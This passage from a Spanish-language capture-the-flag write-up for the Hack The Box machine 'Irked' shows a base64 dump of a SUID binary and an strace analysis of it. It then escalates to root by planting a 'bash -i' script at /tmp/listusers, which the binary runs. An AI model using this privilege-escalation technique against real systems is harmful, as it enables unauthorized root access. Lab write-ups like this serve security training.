AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAcAUAACAFAAABAAAAAQAAAAwAAAC8AwAADQAAAGQGAAAZAAAA9B4AABsAAAAEAAAA
GgAAAPgeAAAcAAAABAAAAPX+/2+sAQAABQAAAGwCAAAGAAAAzAEAAAoAAACpAAAACwAAABAAAAAV
AAAAAAAAAAMAAAAAIAAAAgAAACAAAAAUAAAAEQAAABcAAACcAwAAEQAAAFwDAAASAAAAQAAAABMA
AAAIAAAA+///bwAAAAj+//9vLAMAAP///28BAAAA8P//bxYDAAD6//9vBAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB9BQAAAAAAAPweAAAAAAAA
AAAAAPYDAAAGBAAAFgQAACYEAAAAAAAAICAAAEdDQzogKERlYmlhbiA3LjIuMC04KSA3LjIuMAAA
AAAAAAAAAAAAAAAAAAAAAAAAAFQBAAAAAAAAAwABAAAAAABoAQAAAAAAAAMAAgAAAAAAiAEAAAAA
AAADAAMAAAAAAKwBAAAAAAAAAwAEAAAAAADMAQAAAAAAAAMABQAAAAAAbAIAAAAAAAADAAYAAAAA
ABYDAAAAAAAAAwAHAAAAAAAsAwAAAAAAAAMACAAAAAAAXAMAAAAAAAADAAkAAAAAAJwDAAAAAAAA
AwAKAAAAAAC8AwAAAAAAAAMACwAAAAAA4AMAAAAAAAADAAwAAAAAADAEAAAAAAAAAwANAAAAAABA
BAAAAAAAAAMADgAAAAAAZAYAAAAAAAADAA8AAAAAAHgGAAAAAAAAAwAQAAAAAAAABwAAAAAAAAMA
EQAAAAAANAcAAAAAAAADABIAAAAAAPQeAAAAAAAAAwATAAAAAAD4HgAAAAAAAAMAFAAAAAAA/B4A
AAAAAAADABUAAAAAAOwfAAAAAAAAAwAWAAAAAAAAIAAAAAAAAAMAFwAAAAAAHCAAAAAAAAADABgA
AAAAACQgAAAAAAAAAwAZAAAAAAAAAAAAAAAAAAMAGgABAAAAAAAAAAAAAAAEAPH/DAAAAJAEAAAA
AAAAAgAOAA4AAADQBAAAAAAAAAIADgAhAAAAIAUAAAAAAAACAA4ANwAAACQgAAABAAAAAQAZAEYA
AAD4HgAAAAAAAAEAFABtAAAAcAUAAAAAAAACAA4AeQAAAPQeAAAAAAAAAQATAJgAAAAAAAAAAAAA
AAQA8f8BAAAAAAAAAAAAAAAEAPH/owAAABgIAAAAAAAAAQASAAAAAAAAAAAAAAAAAAQA8f+xAAAA
+B4AAAAAAAAAABMAwgAAAPweAAAAAAAAAQAVAMsAAAD0HgAAAAAAAAAAEwDeAAAAAAcAAAAAAAAA
ABEA8QAAAAAgAAAAAAAAAQAXAAcBAABgBgAAAgAAABIADgAXAQAAAAAAAAAAAAAgAAAAMwEAAIAE
AAAEAAAAEgIOAIQBAAAcIAAAAAAAACAAGABJAQAAJCAAAAAAAAAQABgAEQEAAGQGAAAAAAAAEgAP
AFABAAB5BQAAAAAAABICDgBmAQAAAAAAAAAAAAAiAAAAggEAABwgAAAAAAAAEAAYAI8BAAAAAAAA
AAAAABIAAACfAQAAAAAAAAAAAAASAAAAsQEAAAAAAAAAAAAAIAAAAMABAAAgIAAAAAAAABECGADN
AQAAfAYAAAQAAAARABAA3AEAAAAAAAAAAAAAEgAAAPkBAAAABgAAXQAAABIADgC9AAAAKCAAAAAA
AAAQABkAiAEAAEAEAAAAAAAAEgAOAAkCAAB4BgAABAAAABEAEAAQAgAAJCAAAAAAAAAQABkAHAIA
AH0FAAB+AAAAEgAOACECAAAAAAAAAAAAABIAAAAzAgAAJCAAAAAAAAARAhgAPwIAAAAAAAAAAAAA
IAAAAAMCAAC8AwAAAAAAABIACwAAY3J0c3R1ZmYuYwBkZXJlZ2lzdGVyX3RtX2Nsb25lcwBfX2Rv
X2dsb2JhbF9kdG9yc19hdXgAY29tcGxldGVkLjY1ODYAX19kb19nbG9iYWxfZHRvcnNfYXV4X2Zp
bmlfYXJyYXlfZW50cnkAZnJhbWVfZHVtbXkAX19mcmFtZV9kdW1teV9pbml0X2FycmF5X2VudHJ5
AHZpZXd1c2VyLmMAX19GUkFNRV9FTkRfXwBfX2luaXRfYXJyYXlfZW5kAF9EWU5BTUlDAF9faW5p
dF9hcnJheV9zdGFydABfX0dOVV9FSF9GUkFNRV9IRFIAX0dMT0JBTF9PRkZTRVRfVEFCTEVfAF9f
bGliY19jc3VfZmluaQBfSVRNX2RlcmVnaXN0ZXJUTUNsb25lVGFibGUAX194ODYuZ2V0X3BjX3Ro
dW5rLmJ4AF9lZGF0YQBfX3g4Ni5nZXRfcGNfdGh1bmsuZHgAX19jeGFfZmluYWxpemVAQEdMSUJD
XzIuMS4zAF9fZGF0YV9zdGFydABwdXRzQEBHTElCQ18yLjAAc3lzdGVtQEBHTElCQ18yLjAAX19n
bW9uX3N0YXJ0X18AX19kc29faGFuZGxlAF9JT19zdGRpbl91c2VkAF9fbGliY19zdGFydF9tYWlu
QEBHTElCQ18yLjAAX19saWJjX2NzdV9pbml0AF9mcF9odwBfX2Jzc19zdGFydABtYWluAHNldHVp
ZEBAR0xJQkNfMi4wAF9fVE1DX0VORF9fAF9JVE1fcmVnaXN0ZXJUTUNsb25lVGFibGUAAC5zeW10
YWIALnN0cnRhYgAuc2hzdHJ0YWIALmludGVycAAubm90ZS5BQkktdGFnAC5ub3RlLmdudS5idWls
ZC1pZAAuZ251Lmhhc2gALmR5bnN5bQAuZHluc3RyAC5nbnUudmVyc2lvbgAuZ251LnZlcnNpb25f
cgAucmVsLmR5bgAucmVsLnBsdAAuaW5pdAAucGx0LmdvdAAudGV4dAAuZmluaQAucm9kYXRhAC5l
aF9mcmFtZV9oZHIALmVoX2ZyYW1lAC5pbml0X2FycmF5AC5maW5pX2FycmF5AC5keW5hbWljAC5n
b3QucGx0AC5kYXRhAC5ic3MALmNvbW1lbnQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAGwAAAAEAAAACAAAAVAEAAFQBAAATAAAAAAAAAAAAAAABAAAAAAAAACMAAAAH
AAAAAgAAAGgBAABoAQAAIAAAAAAAAAAAAAAABAAAAAAAAAAxAAAABwAAAAIAAACIAQAAiAEAACQA
AAAAAAAAAAAAAAQAAAAAAAAARAAAAPb//28CAAAArAEAAKwBAAAgAAAABQAAAAAAAAAEAAAABAAA
AE4AAAALAAAAAgAAAMwBAADMAQAAoAAAAAYAAAABAAAABAAAABAAAABWAAAAAwAAAAIAAABsAgAA
bAIAAKkAAAAAAAAAAAAAAAEAAAAAAAAAXgAAAP///28CAAAAFgMAABYDAAAUAAAABQAAAAAAAAAC
AAAAAgAAAGsAAAD+//9vAgAAACwDAAAsAwAAMAAAAAYAAAABAAAABAAAAAAAAAB6AAAACQAAAAIA
AABcAwAAXAMAAEAAAAAFAAAAAAAAAAQAAAAIAAAAgwAAAAkAAABCAAAAnAMAAJwDAAAgAAAABQAA
ABcAAAAEAAAACAAAAIwAAAABAAAABgAAALwDAAC8AwAAIwAAAAAAAAAAAAAABAAAAAAAAACHAAAA
AQAAAAYAAADgAwAA4AMAAFAAAAAAAAAAAAAAABAAAAAEAAAAkgAAAAEAAAAGAAAAMAQAADAEAAAQ
AAAAAAAAAAAAAAAIAAAACAAAAJsAAAABAAAABgAAAEAEAABABAAAIgIAAAAAAAAAAAAAEAAAAAAA
AAChAAAAAQAAAAYAAABkBgAAZAYAABQAAAAAAAAAAAAAAAQAAAAAAAAApwAAAAEAAAACAAAAeAYA
AHgGAACIAAAAAAAAAAAAAAAEAAAAAAAAAK8AAAABAAAAAgAAAAAHAAAABwAANAAAAAAAAAAAAAAA
BAAAAAAAAAC9AAAAAQAAAAIAAAA0BwAANAcAAOgAAAAAAAAAAAAAAAQAAAAAAAAAxwAAAA4AAAAD
AAAA9B4AAPQOAAAEAAAAAAAAAAAAAAAEAAAABAAAANMAAAAPAAAAAwAAAPgeAAD4DgAABAAAAAAA
AAAAAAAABAAAAAQAAADfAAAABgAAAAMAAAD8HgAA/A4AAPAAAAAGAAAAAAAAAAQAAAAIAAAAlgAA
AAEAAAADAAAA7B8AAOwPAAAUAAAAAAAAAAAAAAAEAAAABAAAAOgAAAABAAAAAwAAAAAgAAAAEAAA
HAAAAAAAAAAAAAAABAAAAAQAAADxAAAAAQAAAAMAAAAcIAAAHBAAAAgAAAAAAAAAAAAAAAQAAAAA
AAAA9wAAAAgAAAADAAAAJCAAACQQAAAEAAAAAAAAAAAAAAABAAAAAAAAAPwAAAABAAAAMAAAAAAA
AAAkEAAAHAAAAAAAAAAAAAAAAQAAAAEAAAABAAAAAgAAAAAAAAAAAAAAQBAAAFAEAAAcAAAALAAA
AAQAAAAQAAAACQAAAAMAAAAAAAAAAAAAAJAUAABZAgAAAAAAAAAAAAABAAAAAAAAABEAAAADAAAA
AAAAAAAAAADpFgAABQEAAAAAAAAAAAAAAQAAAAAAAAA=
djmardov@irked:/dev/shm$
```

Ahora el contenido lo guardo en un archivo viewuser.b64 y cambio el encoding:

```text
xbytemx@laptop:~/htb/irked$ base64 -d viewuser.b64 > viewuser.bin
```

Bien, ahora usemos strace para ver sus llamadas:

```text
xbytemx@laptop:~/htb/irked$ strace ./viewuser.bin
execve("./viewuser.bin", ["./viewuser.bin"], 0x7ffe8df0c210 /* 55 vars */) = 0
strace: [ Process PID=7944 runs in 32 bit mode. ]
brk(NULL)                               = 0x57f14000
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No existe el fichero o el directorio)
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xf7fa4000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No existe el fichero o el directorio)
openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_LARGEFILE|O_CLOEXEC) = 3
fstat64(3, {st_mode=S_IFREG|0644, st_size=248316, ...}) = 0
mmap2(NULL, 248316, PROT_READ, MAP_PRIVATE, 3, 0) = 0xf7f67000
close(3)                                = 0
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No existe el fichero o el directorio)
openat(AT_FDCWD, "/lib/i386-linux-gnu/libc.so.6", O_RDONLY|O_LARGEFILE|O_CLOEXEC) = 3
read(3, "\177ELF\1\1\1\3\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\300\254\1\0004\0\0\0"..., 512) = 512
fstat64(3, {st_mode=S_IFREG|0755, st_size=1947056, ...}) = 0
mmap2(NULL, 1955712, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xf7d89000
mprotect(0xf7da2000, 1830912, PROT_NONE) = 0
mmap2(0xf7da2000, 1368064, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x19000) = 0xf7da2000
mmap2(0xf7ef0000, 458752, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x167000) = 0xf7ef0000
mmap2(0xf7f61000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1d7000) = 0xf7f61000
mmap2(0xf7f64000, 10112, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xf7f64000
close(3)                                = 0
set_thread_area({entry_number=-1, base_addr=0xf7fa50c0, limit=0x0fffff, seg_32bit=1, contents=0, read_exec_only=0, limit_in_pages=1, seg_not_present=0, useable=1}) = 0 (entry_number=12)
mprotect(0xf7f61000, 8192, PROT_READ)   = 0
mprotect(0x565fd000, 4096, PROT_READ)   = 0
mprotect(0xf7fd3000, 4096, PROT_READ)   = 0
munmap(0xf7f67000, 248316)              = 0
fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(0x88, 0x3), ...}) = 0
brk(NULL)                               = 0x57f14000
brk(0x57f35000)                         = 0x57f35000
brk(0x57f36000)                         = 0x57f36000
write(1, "This application is being devleo"..., 69This application is being devleoped to set and test user permissions
) = 69
write(1, "It is still being actively devel"..., 37It is still being actively developed
) = 37
rt_sigaction(SIGINT, {sa_handler=SIG_IGN, sa_mask=[], sa_flags=0}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
rt_sigaction(SIGQUIT, {sa_handler=SIG_IGN, sa_mask=[], sa_flags=0}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
clone(child_stack=NULL, flags=CLONE_PARENT_SETTID|SIGCHLD, parent_tidptr=0xffdd644c) = 7945
waitpid(7945, xbytemx  tty7         2019-04-03 17:35 (:0)
[{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 7945
rt_sigaction(SIGINT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, NULL, 8) = 0
rt_sigaction(SIGQUIT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, NULL, 8) = 0
rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=7945, si_uid=1000, si_status=0, si_utime=0, si_stime=0} ---
setuid32(0)                             = -1 EPERM (Operación no permitida)
rt_sigaction(SIGINT, {sa_handler=SIG_IGN, sa_mask=[], sa_flags=0}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
rt_sigaction(SIGQUIT, {sa_handler=SIG_IGN, sa_mask=[], sa_flags=0}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
clone(child_stack=NULL, flags=CLONE_PARENT_SETTID|SIGCHLD, parent_tidptr=0xffdd644c) = 7947
waitpid(7947, sh: 1: /tmp/listusers: not found
[{WIFEXITED(s) && WEXITSTATUS(s) == 127}], 0) = 7947
rt_sigaction(SIGINT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, NULL, 8) = 0
rt_sigaction(SIGQUIT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, NULL, 8) = 0
rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=7947, si_uid=1000, si_status=127, si_utime=0, si_stime=0} ---
exit_group(0)                           = ?
+++ exited with 0 +++
```

Observamos que después de intentar el setuid a 0, a lo cual no tiene permisos en mi máquina, trata de ejecutar el archivo "/tmp/listusers" sin éxito por lo que termina el programa.

Ahora que tenemos una idea de lo que trata el binario, podemos preparar el archivo listusers con un pequeño script en bash que nos mantenga una sesión interactiva:

```text
djmardov@irked:/dev/shm$ printf '#!/bin/bash\nbash -i\n' > /tmp/listusers
djmardov@irked:/dev/shm$ chmod +x /tmp/listusers
djmardov@irked:/dev/shm$ /usr/bin/viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2019-04-03 19:24 (:0)
djmardov pts/0        2019-04-03 20:24 (10.10.15.118)
djmardov pts/3        2019-04-03 19:58 (10.10.14.197)
djmardov pts/5        2019-04-03 19:25 (10.10.13.246)
djmardov pts/6        2019-04-03 19:25 (10.10.15.167)
djmardov pts/11       2019-04-03 19:29 (10.10.14.93)
djmardov pts/16       2019-04-03 19:36 (10.10.15.118)
djmardov pts/17       2019-04-03 20:04 (10.10.15.118)
djmardov pts/24       2019-04-03 20:05 (10.10.14.141)
djmardov pts/25       2019-04-03 20:29 (10.10.15.7)
root@irked:/dev/shm#
```

Y somos root.

# cat root.txt

```text
root@irked:~# cat /root/root.txt
```

... We got root and user flag.

---

Gracias por llegar hasta aquí, hasta la próxima!
